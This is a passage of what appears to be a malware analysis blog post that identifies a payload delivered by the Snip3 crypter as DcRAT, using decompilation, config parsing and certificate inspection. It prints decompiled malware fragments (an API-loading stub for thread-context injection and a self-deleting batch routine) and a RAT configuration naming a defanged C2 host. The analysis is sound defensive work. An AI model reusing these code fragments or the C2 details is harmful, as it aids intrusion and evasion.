        <span class="k">public</span> <span class="k">static</span> <span class="k">readonly</span> <span class="n">DelegateWow64SetThreadContext</span> <span class="n">Wow64SetThreadContext</span> <span class="p">=</span> <span class="n">LoadApi</span><span class="p">&lt;</span><span class="n">DelegateWow64SetThreadContext</span><span class="p">&gt;(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">BytesToString</span><span class="p">(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">IntegerToBytes</span><span class="p">(</span><span class="n">Helper</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">Key</span><span class="p">)),</span> <span class="n">Decode</span><span class="p">.</span><span class="nf">BytesToString</span><span class="p">(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">IntegerToBytes</span><span class="p">(</span><span class="n">Helper</span><span class="p">.</span><span class="n">Wow64SetThreadContext</span><span class="p">,</span> <span class="n">Key</span><span class="p">)));</span>
<span class="p">...</span>
</pre></table></code></div></div><h2 id="how-do-we-know-its-snip3"><span class="mr-2">How do we know it’s Snip3?</span><a href="#how-do-we-know-its-snip3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are multiple different crypter products that adversaries might choose. Other crypters tend to include a DLL injection component embedded in a PowerShell script, but Snip3 is the only one I’ve run across that distributes its injection component as raw C# source and compiled it on the victim host. There are also code overlaps with this <a href="https://blog.morphisec.com/revealing-the-snip3-crypter-a-highly-evasive-rat-loader">blog post from Morphisec</a>. Pretty much the majority of the <code class="language-plaintext highlighter-rouge">CodeDom()</code> and <code class="language-plaintext highlighter-rouge">INSTALL()</code> functions overlapped with the code seen by Morphisec.</p><h2 id="identifying-the-final-payload-dcrat"><span class="mr-2">Identifying the final payload (DcRAT)</span><a href="#identifying-the-final-payload-dcrat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Threats mixed with a crypter in this manner are often difficult to identify. This is largely because the final payload never gets written to disk in plaintext during execution. Most of the time the final payloads I see are RATs and stealers. Now that we’ve extracted the payload from the crypter component, we can explore what the payload is.</p><p>A good first step is to triage the binary with <code class="language-plaintext highlighter-rouge">diec</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/dcrat-snip3$</span><span class="w"> </span>diec payload.exe 
<span class="go">PE32
    Library: .NET(v4.0.30319)[-]
    Compiler: VB.NET(-)[-]
    Linker: Microsoft Linker(8.0)[GUI32]
</span></pre></table></code></div></div><p>Detect-It-Easy thinks we’re looking at a .NET executable compiled using VB.NET. That said, we can try to decompile the executable using <code class="language-plaintext highlighter-rouge">ilspycmd</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/dcrat-snip3$</span><span class="w"> </span>ilspycmd payload.exe <span class="o">&gt;</span> payload.decompiled.cs
<span class="gp">remnux@remnux:~/cases/dcrat-snip3$</span><span class="w"> </span><span class="nb">head </span>payload.decompiled.cs 
<span class="gp">using System;</span><span class="w">
</span><span class="gp">using System.Collections;</span><span class="w">
</span><span class="gp">using System.Collections.Generic;</span><span class="w">
</span><span class="gp">using System.Diagnostics;</span><span class="w">
</span><span class="gp">using System.Drawing.Imaging;</span><span class="w">
</span><span class="gp">using System.IO;</span><span class="w">
</span><span class="gp">using System.IO.Compression;</span><span class="w">
</span><span class="gp">using System.Linq;</span><span class="w">
</span><span class="gp">using System.Management;</span><span class="w">
</span><span class="gp">using System.Net;</span><span class="w">
</span></pre></table></code></div></div><p>Awesome, it looks like we have some valid source code! Inside the source I tend to look for a few things. First, I look for obfuscation. In this sample, it doesn’t look like we have any at all. We can tell this by looking for strings, function names, and variable names.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="n">FileStream</span> <span class="n">fileStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileStream</span><span class="p">(((</span><span class="n">FileSystemInfo</span><span class="p">)</span><span class="n">val</span><span class="p">).</span><span class="nf">get_FullName</span><span class="p">(),</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">CreateNew</span><span class="p">);</span>
<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">File</span><span class="p">.</span><span class="nf">ReadAllBytes</span><span class="p">(</span><span class="n">fileName</span><span class="p">);</span>
<span class="n">fileStream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
<span class="n">Methods</span><span class="p">.</span><span class="nf">ClientOnExit</span><span class="p">();</span>
<span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetTempFileName</span><span class="p">()</span> <span class="p">+</span> <span class="s">".bat"</span><span class="p">;</span>
<span class="k">using</span> <span class="p">(</span><span class="n">StreamWriter</span> <span class="n">streamWriter</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StreamWriter</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
<span class="p">{</span>
    <span class="n">streamWriter</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"@echo off"</span><span class="p">);</span>
    <span class="n">streamWriter</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"timeout 3 &gt; NUL"</span><span class="p">);</span>
    <span class="n">streamWriter</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"START \"\" \""</span> <span class="p">+</span> <span class="p">((</span><span class="n">FileSystemInfo</span><span class="p">)</span><span class="n">val</span><span class="p">).</span><span class="nf">get_FullName</span><span class="p">()</span> <span class="p">+</span> <span class="s">"\""</span><span class="p">);</span>
    <span class="n">streamWriter</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"CD "</span> <span class="p">+</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetTempPath</span><span class="p">());</span>
    <span class="n">streamWriter</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"DEL \""</span> <span class="p">+</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="p">+</span> <span class="s">"\" /f /q"</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">ProcessStartInfo</span> <span class="n">val5</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ProcessStartInfo</span><span class="p">();</span>
<span class="n">val5</span><span class="p">.</span><span class="nf">set_FileName</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
<span class="n">val5</span><span class="p">.</span><span class="nf">set_CreateNoWindow</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
<span class="n">val5</span><span class="p">.</span><span class="nf">set_ErrorDialog</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
<span class="n">val5</span><span class="p">.</span><span class="nf">set_UseShellExecute</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
<span class="n">val5</span><span class="p">.</span><span class="nf">set_WindowStyle</span><span class="p">((</span><span class="n">ProcessWindowStyle</span><span class="p">)</span><span class="m">1</span><span class="p">);</span>
<span class="n">Process</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="n">val5</span><span class="p">);</span>
<span class="n">Environment</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
</pre></table></code></div></div><p>The chunk of code above writes a timeout and deletion command to a Batch script file and then executes it. This is usually a self-deletion measure for RATs and stealers. If obfuscation was involved in this sample, very little of the code above would be readable. The strings would likely be scrambled as would the variable names. In some cases of obfuscation, adversaries may even try to use non-English Unicode characters to make the code unreadable.</p><p>The next thing I tend to look for is some form of a settings/configuration block. We can find this relatively early in the decompiled code:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">Settings</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Por_ts</span> <span class="p">=</span> <span class="s">"usFKhAwZB0s5E032xkSVfg7l+Ch91dfu+A08UlFLF49Q30Ft0dZAYmucm8sTGi/dwaJ+M3FgfdYZ8cPP8D1V+w=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Hos_ts</span> <span class="p">=</span> <span class="s">"F09WwBBWBuVtFrk9Sq585p4pSPXpOKP4VsaBWaqfQ9X6FBhLlsklmDXupr4ISZVUh6yZXGtWnOMqJJK+ObQwpRK6tzgcdVgAEslPhlbKSzQ="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Ver_sion</span> <span class="p">=</span> <span class="s">"yt5wqjF7PeriwF2ATQgo1qaGu8ohghvvWFdY7y7X0C5deqcnj9VHSiD4wq7X5aEN+1P6NP9WYGQQIAbd9kf3lA=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">In_stall</span> <span class="p">=</span> <span class="s">"2t2u9kfC5A1rQP6SZhw4iizbdOd43zK972n9x0JBS1pGDDenkZU0OJAiJeJkrkStNij5dIdB9czAC+W70P4YFg=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Install_Folder</span> <span class="p">=</span> <span class="s">"%AppData%"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Install_File</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Key</span> <span class="p">=</span> <span class="s">"MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">MTX</span> <span class="p">=</span> <span class="s">"jswrBrmmYlOHF153N6vUcJ18KLbBZCuS9UMeDq2PFEF4OMujEGd96QJnoQXKp+uYbf/MH9tlXkezr+SQPtOInOpodPFxZKzrM4H0FLhzg9s="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Certifi_cate</span> <span class="p">=</span> <span class="s">"FRt1VyhVG2vgyDBi5pdeM5A14MRbYXnBrM5qQ1T21evDrOwE8p5VDe0OmshQuNw9cMHBouTEK3wDr4FDYT0RrxdzN60qxRZw+gwkmF+opxLh4N15jgtAB/XtKl1qRsQEJdpUUrFsc/dO1lYQSrS6vCeEMd0v1d+JnXn8k5qid760Fg5u7L+/GQ1cezCarjZ2kQUfd+/QrZ4ukxqzYuTVq/GesG5XYL/CdTV72GZb8LYuleuq+ettGNo1T80CIhXJ6CM6Qqna3XcoyOE5kD2Ioc6BRJeK//H4npK+zzkqnT1/5M/wRzlo4rcqHB1EYDKKYVC2PQhe1VomPkwzqd1h7NRsy2AtUYfWTsEdWT/Exit/D3o03rI9r0diiKn/oUCMms5qaKep53pLWjLkiBtgitSn/XhyvwDPWCpVE4LcJbmk8LzvLGO4HQJRq6hNeynbt2S4c1av+APiUS42WvedHhb1saLO6MsIlTdVvEO5OcAq6apEJXOYuDg05LwEI2Kf3SWSFAZCV4mBA3pcYJaysvNohL40uaGopVlz4JkaYkBnKE6qAJAelv0EAOfuooP1QTni+ikT3Oj9p99dNURmP8YxHIMC+sYQrs2a5dGoUI99M3yk4z49u45YWVGPJ94OGmLb4+z8HFOVNN//0ATqkltkP6z/QPFRapIWz+bPobCHLOPRzT2kygZutJ7G0MQhDc2BUfSg+UWV9yu4omlRsyydBe1TkmKKmVsQakt14AFtbHLCFOSGd44LRlMUupYsQLr6JOUba250039fu+pdxo8S//m4aqmekrI246/6NcfbAMnscN5Y/6lB82fKhIIPQU/8O+HJQj+GGMtKK97PYy1/xjg7qMWhn62qCIRSgY4J5/ZKHptZrAKijG7EmUBZW8qVub9yGGSKcS5UZ2IEltY+PJgxCcdcoTmGdKDU5oEMaxP56/51vx4QFISnqoZvKrr9tD7xmn6Xjbnqjy5tsPI90RPw/6lsaGnGe4z/mWrjpOI3WXLI1WkASnjgaYhaTCaLGQ2AVUnp+coQnEyhEP60z24W3o6RGL9ClvxYMzZJAMCYAkAeaMoQ5b36uK4F"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Server_signa_ture</span> <span class="p">=</span> <span class="s">"SINLJan/0TFj5M2ElE91NPC7mWSMGkC99zKmLdlQkd/I8LyHWPnj5hDLz90v8qYZRV1d9X3mLu4fDn/EYWiG/hC2J2j9MrNsHUeu/rSdecMeGqWq925+ecTXftWSMrpxlYhA2KgcKBbpM4P/eH4SffRgDYtch6pl6H8mx9y595kAGaqF0lugOWLqvWk0rSahBToNlLvpdC9ivSuWyuUhpnWlHsZIifC7/qsMA5JUQVpw/kxJfEzxtvz2mEQO00/U3a95SMD5N+DwL4VCRmN6mX0lHfjIpO9L6yBghZhW1so="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="n">X509Certificate2</span> <span class="n">Server_Certificate</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="n">Aes256</span> <span class="n">aes256</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Paste_bin</span> <span class="p">=</span> <span class="s">"bJMeCQ+O0TOP7Mimb+LvM7YW+MG+LMhrig9F98i7Nq0Cf6vDG5QD0dDmvlpP2i6osVFcGu8J6upk/n9X7YOx1g=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">BS_OD</span> <span class="p">=</span> <span class="s">"5e5wxuNXiS4QhUtSFmcXlMN/zwGpAgWFR7TAEtRIDeyN7OWkaRRNeC9nJ6ntc9Hvc8wF3OAqcV8YGGhscsQSSg=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Hw_id</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">De_lay</span> <span class="p">=</span> <span class="s">"1"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Group</span> <span class="p">=</span> <span class="s">"wZWrR/yvCwjmNMoS1xk3yYz/TleFz0+gmpNA4gJZ2vgSeyfX/K73NfIcVfuLUGPasaVgSUO6pLJoNVcB/FqlSw=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Anti_Process</span> <span class="p">=</span> <span class="s">"aZ12B0T+g0y0kb+3txbww4Hoe7T+8yiR2wblpQCzwI+pB0INXDGOhXaWNkf8CLZDqhgO/CPYoMwlZJ0FMl0Fhg=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">An_ti</span> <span class="p">=</span> <span class="s">"yFsA3ZmKBpFvdy3/VrPEwMuoG+BVaWzfBohXvIqmZ2LoaiIqz+StD0aFxFuZIufPAvKtRXVJZ2NUVhR7YAGyRA=="</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="kt">bool</span> <span class="nf">InitializeSettings</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="p">...</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Settings</code> class for this payload contains a block of settings that appear consistent with <a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Client/Settings.cs">AsyncRAT settings</a>. Since it looks like we’re working with AsyncRAT or a clone of it, we can use the <a href="https://github.com/jeFF0Falltrades/Tutorials/tree/master/asyncrat_config_parser">AsyncRAT Config Parser from @jeFF0Falltrades</a> to obtain the plaintext configuration.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/dcrat-snip3$</span><span class="w"> </span>./async_rat_config_parser.py payload.exe | jq
<span class="go">[
  {
    "file_path": "payload.exe",
    "aes_key": "846ca7dddc5312f58468a967e5e7a4ec9e6de4120b03a1806dbfd976785a95d8",
    "aes_salt": "4463526174427971777164616e6368756e",
    "config": {
      "Por_ts": "5900",
      "Hos_ts": "rick63.publicvm[.]com",
      "Ver_sion": " 1.0.7",
      "In_stall": "false",
      "Install_Folder": "%AppData%",
      "Install_File": "",
      "Key": "MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4=",
      "MTX": "DcRatMutex_qwqdanchun",
      "Certifi_cate": "MIICMDCCAZmgAwIBAgIVANDdhyIzFkRkVUdU1pUsWShwjeXTMA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTIwMTEyNzIxMjU0NVoXDTMxMDkwNjIxMjU0NVowEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAJAPN6hAAYtlFpprsg+awNYGXe+gvrIVoVQz2ubNjglQKceBMbhrB9fJZfXJkDLol6/a3Jd4JycS51W+zZgLbcjK8rwRyJ+AUI9TJN4ghCPvSgqXiqTzwruPo+z8B41xcddSJ8Iv49ReFpZGNfbzC4AL5U3gWj+Gq+o4Eh1TigrrAgMBAAGjMjAwMB0GA1UdDgQWBBSieJAE4Zd65wRgTOwM9yD2xjDKZjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAH+wbEwYgTSF3NRuSaLbjALT8E5lmhrkkc7l8R7dojnqZqGA6GqIR3B1aERDKeX6YY3msdmw4uK4K7qWXuWRhjn1Zbweea4YrUyTLtTu1OYJpE9z7vVTfXi7Pkl+j9187kZ8f+S+EvFo9aw2YO5jK9UTyZ8dhtQuhpC9sRSCwQ5f",
      "Server_signa_ture": "UWZseCaaZjexEDVQ2lOsjGF3/bzIWM+AtaMG8YJOKeCH6T82VGt+odwaoTThFyioEEzEKgOuucbs5V3F2LoXzpK1RtKu8B4z62M6aSvVRE1NYj3zgTzf4jSqH+Y5W1G+OA4tBTUv6V21bxJSCYeMSAZFXT6Xil6DULdEBDYKzUs=",
      "Paste_bin": "null",
      "BS_OD": "false",
      "De_lay": "1",
      "Group": "Default",
      "Anti_Process": "false",
      "An_ti": "false"
    }
  }
]
</span></pre></table></code></div></div><p>Now that we’ve parsed the configuration, a couple things look slightly odd. In authentic AsyncRAT payloads the mutex (MTX) value appears similar to <code class="language-plaintext highlighter-rouge">AsyncMutex_6SI8OkPnk</code>. In this case, the MTX value is <code class="language-plaintext highlighter-rouge">DcRatMutex_qwqdanchun</code>. This leads me to hypothesize that this payload is really DcRAT instead of AsyncRAT. So how can we prove or disprove it? DCRat is essentially a clone of AsyncRAT with some extra things added in, so the configuration portion is definitely close enough to be parsed by anything that can handle AsyncRAT. The next piece of evidence would be the Certificate field in the configuration. Once parsed using CyberChef’s “Parse X.509 Certificate (base64)” recipe, we can see the details of the self-signed certificate included with the payload:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>Version:          3 (0x02)
Serial number:    1192410316816341397168958607972492981491697837523 (0x00d0dd872233164464554754d6952c5928708de5d3)
Algorithm ID:     SHA512withRSA
Validity
  Not Before:     27/11/2020 21:25:45 (dd-mm-yyyy hh:mm:ss) (201127212545Z)
  Not After:      06/09/2031 21:25:45 (dd-mm-yyyy hh:mm:ss) (310906212545Z)
Issuer
  CN = DcRat Server
  OU = qwqdanchun
  O  = DcRat By qwqdanchun
  L  = SH
  C  = CN
Subject
  CN = DcRat
Public Key
  Algorithm:      RSA
  Length:         1024 bits
  Modulus:        90:0f:37:a8:40:01:8b:65:16:9a:6b:b2:0f:9a:c0:d6:
                  06:5d:ef:a0:be:b2:15:a1:54:33:da:e6:cd:8e:09:50:
                  29:c7:81:31:b8:6b:07:d7:c9:65:f5:c9:90:32:e8:97:
                  af:da:dc:97:78:27:27:12:e7:55:be:cd:98:0b:6d:c8:
                  ca:f2:bc:11:c8:9f:80:50:8f:53:24:de:20:84:23:ef:
                  4a:0a:97:8a:a4:f3:c2:bb:8f:a3:ec:fc:07:8d:71:71:
                  d7:52:27:c2:2f:e3:d4:5e:16:96:46:35:f6:f3:0b:80:
                  0b:e5:4d:e0:5a:3f:86:ab:ea:38:12:1d:53:8a:0a:eb
  Exponent:       65537 (0x10001)
Certificate Signature
  Algorithm:      SHA512withRSA
  Signature:      7f:b0:6c:4c:18:81:34:85:dc:d4:6e:49:a2:db:8c:02:
                  d3:f0:4e:65:9a:1a:e4:91:ce:e5:f1:1e:dd:a2:39:ea:
                  66:a1:80:e8:6a:88:47:70:75:68:44:43:29:e5:fa:61:
                  8d:e6:b1:d9:b0:e2:e2:b8:2b:ba:96:5e:e5:91:86:39:
                  f5:65:bc:1e:79:ae:18:ad:4c:93:2e:d4:ee:d4:e6:09:
                  a4:4f:73:ee:f5:53:7d:78:bb:3e:49:7e:8f:dd:7c:ee:
                  46:7c:7f:e4:be:12:f1:68:f5:ac:36:60:ee:63:2b:d5:
                  13:c9:9f:1d:86:d4:2e:86:90:bd:b1:14:82:c1:0e:5f

Extensions
  subjectKeyIdentifier :
    a2789004e1977ae704604cec0cf720f6c630ca66
  basicConstraints CRITICAL:
    cA=true
</pre></table></code></div></div><p>In the case of AsyncRAT, the CN field would be “AsyncRAT Server” or something similar. In this case, it’s “DCRat Server”, more evidence of DCRat. The final piece of evidence comes from an interesting place in the payload’s decompiled source. When AsyncRAT and its clones generate a RAT client, the settings of that client are encrypted with AES and salted. In the case of <a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Client/Algorithm/Aes256.cs">AsyncRAT, the salt is a byte array</a>:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="k">readonly</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">Salt</span> <span class="p">=</span>
            <span class="p">{</span>
            <span class="m">0xBF</span><span class="p">,</span> <span class="m">0xEB</span><span class="p">,</span> <span class="m">0x1E</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0xFB</span><span class="p">,</span> <span class="m">0xCD</span><span class="p">,</span> <span class="m">0x97</span><span class="p">,</span> <span class="m">0x3B</span><span class="p">,</span> <span class="m">0xB2</span><span class="p">,</span> <span class="m">0x19</span><span class="p">,</span> <span class="m">0x2</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0xA5</span><span class="p">,</span> <span class="m">0x78</span><span class="p">,</span> <span class="m">0x43</span><span class="p">,</span> <span class="m">0x0</span><span class="p">,</span> <span class="m">0x3D</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span>
            <span class="m">0x44</span><span class="p">,</span> <span class="m">0xD2</span><span class="p">,</span> <span class="m">0x1E</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0xB9</span><span class="p">,</span> <span class="m">0xD4</span><span class="p">,</span> <span class="m">0xF1</span><span class="p">,</span> <span class="m">0x80</span><span class="p">,</span> <span class="m">0xE7</span><span class="p">,</span> <span class="m">0xE6</span><span class="p">,</span> <span class="m">0xC3</span><span class="p">,</span> <span class="m">0x39</span><span class="p">,</span> <span class="m">0x41</span>
        <span class="p">};</span>
</pre></table></code></div></div><p>In the sample, the salt value is different:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="k">readonly</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">Salt</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"DcRatByqwqdanchun"</span><span class="p">);</span>
</pre></table></code></div></div><p>This finding in the payload source is consistent with the source code of <a href="https://github.com/qwqdanchun/DcRat/blob/main/Client/Helper/Aes256.cs">DcRAT in Github</a>. Thus, we can definitively say this threat is DcRAT! Remember, when analyzing payloads protected with crypters you can’t always assume they lead to one particular threat, you have to positively identify the final threat using evidence instead of assumptions.</p><p>Thank you for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/dcrat/" class="post-tag no-text-decoration" >dcrat</a> <a href="/tags/vbscript/" class="post-tag no-text-decoration" >vbscript</a> <a href="/tags/snip3/" class="post-tag no-text-decoration" >snip3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Snip3 Crypter used with DCRat via VBScript - Tony Lambert&amp;url=https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Snip3 Crypter used with DCRat via VBScript - Tony Lambert&amp;u=https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/&amp;text=Snip3 Crypter used with DCRat via VBScript - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a 